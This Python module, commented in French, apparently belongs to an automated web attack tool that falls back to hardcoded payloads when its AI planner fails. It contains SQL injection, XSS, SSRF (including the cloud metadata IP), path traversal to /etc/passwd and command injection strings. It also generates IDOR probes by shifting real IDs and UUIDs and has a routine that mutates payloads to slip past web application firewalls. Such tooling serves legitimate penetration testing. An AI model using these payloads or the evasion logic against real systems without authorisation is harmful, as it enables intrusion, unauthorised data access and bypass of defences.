"""
Strategist Fallback Module
==========================
Payloads par défaut et plans de fallback quand l'IA échoue.
Inclut aussi l'évasion WAF.
"""

import re
import logging
from typing import List, Optional, Dict, Any, TYPE_CHECKING

from ghost_hunter.core.contracts import (
    TriageDecision, AttackPlan, PayloadVariant, TestStep
)

if TYPE_CHECKING:
    from ghost_hunter.core.evasion.mutator import PayloadMutator

logger = logging.getLogger(__name__)


# Payloads de base par type de vuln (fallback si IA échoue)
DEFAULT_PAYLOADS: Dict[str, List[dict]] = {
    "IDOR": [
        {"payload": "1", "encoding": "none"},
        {"payload": "2", "encoding": "none"},
        {"payload": "0", "encoding": "none"},
        {"payload": "-1", "encoding": "none"},
        {"payload": "999999", "encoding": "none"},
    ],
    "SQLi": [
        {"payload": "'", "encoding": "none"},
        {"payload": "' OR '1'='1", "encoding": "none"},
        {"payload": "1' AND SLEEP(5)--", "encoding": "none"},
        {"payload": "1 UNION SELECT NULL--", "encoding": "none"},
    ],
    "XSS": [
        {"payload": "<script>alert(1)</script>", "encoding": "none"},
        {"payload": "\"><script>alert(1)</script>", "encoding": "none"},
        {"payload": "javascript:alert(1)", "encoding": "none"},
        {"payload": "<img src=x onerror=alert(1)>", "encoding": "none"},
    ],
    "SSRF": [
        {"payload": "http://127.0.0.1", "encoding": "none"},
        {"payload": "http://localhost", "encoding": "none"},
        {"payload": "http://169.254.169.254", "encoding": "none"},
        {"payload": "file:///etc/passwd", "encoding": "none"},
    ],
    "LFI": [
        {"payload": "../../../etc/passwd", "encoding": "none"},
        {"payload": "....//....//....//etc/passwd", "encoding": "none"},
        {"payload": "/etc/passwd", "encoding": "none"},
        {"payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "encoding": "none"},
    ],
    "CMDi": [
        {"payload": "; id", "encoding": "none"},
        {"payload": "| id", "encoding": "none"},
        {"payload": "`id`", "encoding": "none"},
        {"payload": "$(id)", "encoding": "none"},
    ],
}


def get_quick_payloads(vuln_type: str) -> List[PayloadVariant]:
    """
    Retourne des payloads rapides pour un type de vuln.
    
    Args:
        vuln_type: Type de vulnérabilité (IDOR, SQLi, XSS, etc.)
        
    Returns:
        Liste de PayloadVariant
    """
    # Cherche d'abord exact, puis upper
    default = DEFAULT_PAYLOADS.get(vuln_type)
    if not default:
        default = DEFAULT_PAYLOADS.get(vuln_type.upper(), DEFAULT_PAYLOADS["IDOR"])
    return [
        PayloadVariant(payload=p["payload"], encoding=p.get("encoding", "none"))
        for p in default
    ]


def create_fallback_plan(triage: TriageDecision) -> AttackPlan:
    """
    Crée un plan de fallback si l'IA échoue.
    
    Génère des payloads intelligents basés sur les valeurs réelles
    trouvées dans la requête.
    
    Args:
        triage: Décision du triage
        
    Returns:
        AttackPlan avec payloads de fallback
    """
    vuln_class = triage.suggested_vulns[0] if triage.suggested_vulns else "IDOR"
    
    # Trouver les points d'injection
    req = triage.request.request.request
    injection_points = list(req.query_params.keys())
    if req.body_json:
        injection_points.extend(req.body_json.keys())
    
    # ═══ Parser les form fields URL-encoded ═══
    form_fields: Dict[str, str] = {}
    if req.body and not req.body_json:
        content_type = req.headers.get('content-type', req.headers.get('Content-Type', ''))
        if 'x-www-form-urlencoded' in content_type.lower():
            try:
                from urllib.parse import parse_qs, unquote
                form_data = parse_qs(req.body, keep_blank_values=True)
                for key, values in form_data.items():
                    clean_key = unquote(key)
                    # Extraire le nom de base et les champs nested
                    if '[' in clean_key:
                        # visit_motive_categories_attributes[][id] → id
                        nested = re.findall(r'\[([^\]]+)\]', clean_key)
                        for n in nested:
                            if n and n not in injection_points:
                                injection_points.append(n)
                                # Stocker la valeur pour le fallback IDOR
                                if values:
                                    form_fields[n] = values[0]
                    else:
                        if clean_key not in injection_points:
                            injection_points.append(clean_key)
                        if values:
                            form_fields[clean_key] = values[0]
                logger.info(f"📝 Fallback: Parsed {len(form_fields)} form fields")
            except Exception as e:
                logger.warning(f"Failed to parse form body in fallback: {e}")
    
    # ═══ Détecter les path parameters ({uuid}, {id}, etc.) ═══
    path = req.path
    path_placeholders = re.findall(r'\{([^}]+)\}', path)
    for placeholder in path_placeholders:
        # Format comme attendu par http_runner: soit "{uuid}" soit "resource/{uuid}"
        # Trouver le segment avant le placeholder
        match = re.search(rf'([a-zA-Z_]+)/\{{{placeholder}\}}', path)
        if match:
            # Format composite: "tasks/{uuid}"
            composite_point = f"{match.group(1)}/{{{placeholder}}}"
            if composite_point not in injection_points:
                injection_points.insert(0, composite_point)
        else:
            # Format simple: "{uuid}"
            simple_point = f"{{{placeholder}}}"
            if simple_point not in injection_points:
                injection_points.insert(0, simple_point)
    
    # Générer des payloads intelligents pour IDOR
    payloads: List[PayloadVariant] = []
    if vuln_class.upper() == "IDOR":
        # Chercher des valeurs numériques dans les params/body pour générer des variations
        numeric_values: Dict[str, int] = {}
        
        # Query params
        for key, val in req.query_params.items():
            if isinstance(val, (int, float)) or (isinstance(val, str) and val.isdigit()):
                numeric_values[key] = int(val) if isinstance(val, str) else val
        
        # Body JSON
        if req.body_json:
            for key, val in req.body_json.items():
                if isinstance(val, (int, float)) or (isinstance(val, str) and str(val).isdigit()):
                    try:
                        numeric_values[key] = int(val)
                    except:
                        pass
        
        # Form fields URL-encoded (parsed above)
        for key, val in form_fields.items():
            if isinstance(val, str) and val.isdigit():
                try:
                    numeric_values[key] = int(val)
                except:
                    pass
        
        if numeric_values:
            logger.info(f"📊 IDOR fallback: Found numeric values: {numeric_values}")
            # Générer des payloads basés sur les vraies valeurs
            for key, original_val in numeric_values.items():
                # Variations IDOR: -1, +1, autre user, 0, négatif
                variations = [
                    str(original_val - 1),  # Previous ID
                    str(original_val + 1),  # Next ID
                    "1",                     # First ID (admin?)
                    str(original_val - 100), # Way different
                    "0",                     # Zero
                    "-1",                    # Negative
                ]
                for v in variations:
                    payloads.append(PayloadVariant(payload=v, encoding="none"))
                
                # Limiter les injection_points aux champs numériques trouvés
                if key not in injection_points:
                    injection_points.insert(0, key)
            
            logger.info(f"📊 IDOR fallback: Generated {len(payloads)} payloads from original values")
        
        # ═══ Générer des payloads UUID si path contient des UUIDs ═══
        uuid_pattern = r'[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}'
        uuid_matches = re.findall(uuid_pattern, path, re.IGNORECASE)
        if uuid_matches:
            original_uuid = uuid_matches[0]
            # Générer des UUIDs IDOR: variations sur le dernier segment
            uuid_parts = original_uuid.split('-')
            last_part = uuid_parts[-1]
            
            # Variations UUID: modifier les derniers caractères
            uuid_payloads = [
                # Même UUID sauf dernier caractère +1
                f"{'-'.join(uuid_parts[:-1])}-{last_part[:-1]}{'0' if last_part[-1] == 'f' else chr(ord(last_part[-1])+1)}",
                # Même UUID sauf dernier caractère -1
                f"{'-'.join(uuid_parts[:-1])}-{last_part[:-1]}{'f' if last_part[-1] == '0' else chr(ord(last_part[-1])-1)}",
                # UUID avec tous 0
                "00000000-0000-0000-0000-000000000000",
                # UUID avec tous 1
                "11111111-1111-1111-1111-111111111111",
                # UUID aléatoire
                "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
            ]
            for uuid_payload in uuid_payloads:
                payloads.append(PayloadVariant(payload=uuid_payload, encoding="none"))
            
            logger.info(f"📊 IDOR fallback: Added {len(uuid_payloads)} UUID payloads for path parameter")
    
    # Fallback aux payloads par défaut si pas de valeurs numériques
    if not payloads:
        default_payloads = DEFAULT_PAYLOADS.get(vuln_class.upper(), DEFAULT_PAYLOADS["IDOR"])
        payloads = [
            PayloadVariant(
                payload=p["payload"],
                encoding=p.get("encoding", "none")
            )
            for p in default_payloads
        ]
    
    return AttackPlan(
        request=triage,
        tool="custom",
        vuln_class=vuln_class,
        payloads=payloads[:10],  # Max 10 payloads
        injection_points=injection_points[:3],  # Max 3
        test_sequence=[
            TestStep(
                order=1,
                action="send_request",
                description=f"Test {vuln_class} with smart payloads",
                expected_indicators=["error", "200", "changed"]
            )
        ],
        baseline_needed=True,
        max_requests=len(payloads) * max(1, len(injection_points)),
        delay_between_ms=1000,
        reasoning="Fallback plan - Smart IDOR variations" if vuln_class.upper() == "IDOR" else "Fallback plan"
    )


def apply_waf_evasion(
    plan: AttackPlan,
    mutator: Optional['PayloadMutator']
) -> AttackPlan:
    """
    Applique l'évasion WAF aux payloads du plan.
    
    Teste chaque payload contre le WAFChecker et:
    - Garde les payloads non-bloqués
    - Mute les payloads bloqués
    - Supprime les payloads qui ne peuvent pas être mutés
    
    Args:
        plan: Le plan d'attaque avec payloads
        mutator: Instance du PayloadMutator
        
    Returns:
        Plan avec payloads filtrés/mutés
    """
    if not mutator:
        return plan
    
    vuln_type = plan.vuln_class.lower() if plan.vuln_class else "sqli"
    safe_payloads: List[PayloadVariant] = []
    mutated_count = 0
    blocked_count = 0
    
    for variant in plan.payloads:
        # Vérifier si bloqué
        result = mutator.auto_evade(variant.payload, vuln_type, max_depth=2)
        
        if not result.all_blocked:
            if result.best_mutation and result.best_mutation.evades:
                # Payload muté
                safe_payloads.append(PayloadVariant(
                    payload=result.best_mutation.mutated,
                    encoding=variant.encoding,
                    evasion=result.best_mutation.transform
                ))
                mutated_count += 1
                logger.debug(f"🛡️ Mutated: {variant.payload[:30]} → {result.best_mutation.mutated[:30]}")
            else:
                # Payload original OK
                safe_payloads.append(variant)
        else:
            blocked_count += 1
            logger.debug(f"🚫 Blocked (no evasion found): {variant.payload[:30]}")
    
    if mutated_count > 0 or blocked_count > 0:
        logger.info(f"🛡️ WAF Evasion: {len(safe_payloads)} safe, {mutated_count} mutated, {blocked_count} blocked")
        plan.evasion_techniques.append(f"waf_evasion:{mutated_count}_mutations")
    
    plan.payloads = safe_payloads
    return plan
